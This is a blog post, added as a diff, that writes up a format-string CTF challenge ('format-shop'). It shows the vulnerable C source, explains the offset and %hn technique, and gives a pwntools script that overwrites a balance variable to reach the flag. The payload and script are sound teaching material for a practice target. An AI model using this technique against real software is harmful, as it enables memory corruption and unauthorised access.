@@ -1,0 +1,173 @@
+---
+title: Binary exploitaion :format-string vulnerability
+date: '2022-12-30'
+tags: ['pwn', 'CTF']
+draft: false
+summary: 'writeup for a binary exploitaion challenge that was issued in the jingle bell CTF (format-string vulnerability).'
+authors: ['oussema zouch']
+---
+### format-shop challenge from the jingle bell CTF .
+given the source code:
+
+```c
+#include <stdio.h>
+
+unsigned int money = 1500;
+
+int menu(){
+    puts("1. Go shopping!");
+    puts("2. Give feedback.");
+    puts("3. Bye");
+
+    int tmp;
+    printf("> ");
+    scanf("%d", &tmp);
+    getchar();
+    return tmp;
+}
+
+void setup(){
+    setvbuf(stderr, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+}
+
+void flag(){
+	char c;
+    FILE *fp=fopen("./flag.txt","r");
+    if(fp){
+        while( (c=getc(fp)) != EOF)
+            putchar(c);
+        fclose(fp);
+    }else{
+        puts("Flag file not found!");
+    }
+}
+
+void shop(){
+    unsigned int prices[5] = {69, 12, 322, 554, 0x1337};
+    char* items[5] = {"Ice", "Fish", "Icecream", "Sugar", "flag"};
+
+    for(int i=0; i<5; i++){
+        printf("%d. %s:%d coins.\n", i+1, items[i], prices[i]);
+    }
+
+    printf("You have %u coins\n", money);
+    int idx;
+    printf("Item> ");
+    scanf("%d", &idx);
+    getchar();
+
+    if(idx < 1 || idx > 5){
+        puts("Invalid index.");
+        return;
+    }
+
+    idx--; // To use as index
+    if(prices[idx] > money){
+        puts("Not enough money");
+        return;
+    }
+
+    if(idx == 4){
+        flag();
+    }
+    money -= prices[idx];
+    puts("Item bought!");
+}
+
+void feedback(){
+    char feedbackContent[250];
+    printf("> ");
+    int c = read(0, feedbackContent, 249);
+
+    if(c == -1) return;
+    feedbackContent[c] = '\0';
+    
+    printf(feedbackContent);
+    puts("Thanks for the feedback!");
+}
+
+int main(){
+    setup();
+
+    int choice;
+    do{
+        choice = menu();
+        switch (choice)
+        {
+        case 1:
+            shop();
+            break;
+        case 2:
+            feedback();
+            break;
+        default:
+            break;
+        }
+    }while(choice != 3);
+
+    return 0;
+}
+```
+there is a function called flag() in the source code that we can reach if we buy the the flag item which costs 0x1337 (4919) but we only have 1500 .
+#### first let’s run some basic file checks .
+![file check](/static/images/format1.png)
+
+we can see that The No eXecute or the NX bit is enabled which means that we can’t jump to custom shellcode after being injected in the stack.
+
+— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
+
+
+
+![](/static/images/format2.png)
+
+hmmmm!!!that’s a **format-string vulnerability** and 6 is the first formatter’s offset we control since the hex representation of **‘%p-’ is 0x70252d**.
+
+we can use this vulnerability and try to modify our money variable to make it higher than 4919.
+
+**money_add**=0x0000000000404060
+
+we will use the %nformat specifier which takes in a pointer (memory address) and writes there the number of characters written so far.
+
+our payload will look like :payload=p64(**money_add**)+b’a’*5000+ b’%6$n’. so we expect that with this payload we will write 5000+4 bytes to money_add.
+
+***BUT IT DOESN’T WORK!!!!!!!!!!!!!!!***
+
+The reason it doesn’t work is that *printf* stops at null bytes, and the money-address contains null bytes. We have to put the format specifier first.
+
+there is also another problem that will prevent this payload from working is that we can’t write 5004 bytes into memory .
+
+we will try to write in the higher bytes of our address. there is a way to do this with %hn format specifier.
+
+# CONSTRUCTING THE PAYLOAD
+
+**_payload=b’a’\*16+b’%9$hn|||’+p64(money_add+2)_**
+
+let’ s break and take a look at **money** in gdb :
+
+![](/static/images/format3.png)
+money is equal to 0x00000000001005dc (= 1050076)
+
+## final exploit:
+
+```python
+from pwn import * 
+import pwnlib.util.packing as pack
+elf=ELF('main')
+#p=elf.process()
+p=remote('REMOTE_server',PORT)
+money_add=0x0000000000404060
+p.sendline(b'2')
+payload=b'a'*16
+payload+=b'%9$hn|||'
+payload+=p64(money_add+2)
+payload+=b'%10$hn||'
+payload+=p64(money_add)
+p.sendline(payload)
+p.recvuntil(b'3. Bye')
+p.sendline(b'2')
+p.interactive()
+```
+
+Special Thanks to **Securinets INSAT** for bringing to life this challenging CTF .i really enjoyed learning new stuff related mainly to the binary exploitation category.
